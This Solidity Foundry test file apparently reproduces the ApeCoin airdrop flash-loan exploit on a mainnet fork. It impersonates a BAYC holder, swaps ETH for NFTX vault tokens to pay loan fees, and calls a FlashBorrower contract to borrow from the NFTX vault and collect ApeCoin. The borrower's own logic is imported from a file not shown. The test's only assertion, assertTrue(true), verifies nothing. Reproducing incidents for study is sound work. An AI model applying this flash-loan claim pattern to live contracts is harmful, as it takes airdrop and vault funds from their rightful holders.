// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../src/IERC20Upgradeable.sol";
import "../src/Contract.sol";
import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "forge-std/console.sol";

library SafeMathUniswap {
    function add(uint x, uint y) internal pure returns (uint z) {
        require((z = x + y) >= x, 'ds-math-add-overflow');
    }

    function sub(uint x, uint y) internal pure returns (uint z) {
        require((z = x - y) <= x, 'ds-math-sub-underflow');
    }

    function mul(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');
    }
}
library UniswapV2Library {
    using SafeMathUniswap for uint;

    // fetches and sorts the reserves for a pair
    function getReserves(address factory, address tokenA, address tokenB) internal view returns (uint reserveA, uint reserveB) {
        (address token0,) = sortTokens(tokenA, tokenB);
        (uint reserve0, uint reserve1,) = IUniswapV2Pair(0xD829dE54877e0b66A2c3890b702fa5Df2245203E).getReserves();
        (reserveA, reserveB) = tokenA == token0 ? (reserve0, reserve1) : (reserve1, reserve0);
    }
     function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {
        require(tokenA != tokenB, 'UniswapV2Library: IDENTICAL_ADDRESSES');
        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        require(token0 != address(0), 'UniswapV2Library: ZERO_ADDRESS');
    }
    

    // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) {
        require(amountIn > 0, 'UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
        uint amountInWithFee = amountIn.mul(997);
        uint numerator = amountInWithFee.mul(reserveOut);
        uint denominator = reserveIn.mul(1000).add(amountInWithFee);
        amountOut = numerator / denominator;
    } 

    // performs chained getAmountOut calculations on any number of pairs
    function getAmountsOut(address factory, uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) {
        require(path.length >= 2, 'UniswapV2Library: INVALID_PATH');
        amounts = new uint[](path.length);
        amounts[0] = amountIn;
        for (uint i; i < path.length - 1; i++) {
            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]);
            amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut);
        }
    }
    function getAmountsIn(address factory, uint amountOut, address[] memory path) internal view returns (uint[] memory amounts) {
        require(path.length >= 2, 'UniswapV2Library: INVALID_PATH');
        amounts = new uint[](path.length);
        amounts[amounts.length - 1] = amountOut;
        for (uint i = path.length - 1; i > 0; i--) {
            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i - 1], path[i]);
            amounts[i - 1] = getAmountIn(amounts[i], reserveIn, reserveOut);
        }
    }

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint amountIn) {
        require(amountOut > 0, 'UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
        uint numerator = reserveIn.mul(amountOut).mul(1000);
        uint denominator = reserveOut.sub(amountOut).mul(997);
        amountIn = (numerator / denominator).add(1);
    }

}


interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


interface Sushiswap{
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
  external
  payable
  returns (uint[] memory amounts);
}


contract ContractTest is Test {
    nftxvault vault;
    FlashBorrower flashborrower;

    AirdropGrapesToken airdropclaimcontract;  
    Sushiswap sushi;  
    address BoredApeowner= address(0xe16c0E1Bf3B75F67E83C9e47B9c0Eb8Bf1B99CCd);
    address apecoin = address(0x4d224452801ACEd8B2F0aebE155379bb5D594381);
    bytes32 constant private RETURN_VALUE = keccak256("ERC3156FlashBorrower.onFlashLoan");


    function setUp() public {
        airdropclaimcontract = AirdropGrapesToken(0x025C6da5BD0e6A5dd1350fda9e3B6a614B205a1F);
        vault = nftxvault(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5);
        sushi = Sushiswap(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
        flashborrower = new FlashBorrower();
   
// Here we are buying some BAYC tokens thorugh sushiswap to pay the flash loan fees of NFTx vault.
// We are swapping Eth to get 0.4 bayc according to the price at that time
        address[] memory path = new address[](2);
        path[0]= 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        path[1]= 0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5;
        uint[] memory amounts= new uint[](2);
        IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).approve(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F,100000000000000000000);
        vm.deal(address(BoredApeowner),50000000000000000000);
        
        vm.prank(address(BoredApeowner));
        uint[] memory amount  = UniswapV2Library.getAmountsIn(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac,400000000000000000,path);
        sushi.swapETHForExactTokens{value: amount[0] }(400000000000000000,path,address((BoredApeowner)),block.timestamp + 100);
        // Transferring the bayc coins to the flash borrower contract . 
        vm.prank(address(BoredApeowner));
        IERC20(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5).transfer(address(flashborrower),400000000000000000);
        uint bal = IERC20(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5).balanceOf(address(flashborrower));
        console.log("balance of BAYC tokens sushi swap",bal);
    }



    function testClaim() public {
        assertTrue(true);
        // block 14403997
        // vm.prank(BoredApeowner);
        // airdropclaimcontract.claimTokens();
        // console.log(IERC20(apecoin).balanceOf(BoredApeowner));
        vm.label(address(flashborrower),"botcontract");
        // calling the borrow function of the flash borrower contract
       flashborrower.flashBorrow(address(vault),address(vault),5000000000000000000);
       // checking if we successfully received ape coins 
       console.log(IERC20(0x4d224452801ACEd8B2F0aebE155379bb5D594381).balanceOf(address(flashborrower)));
    }
    
   
}
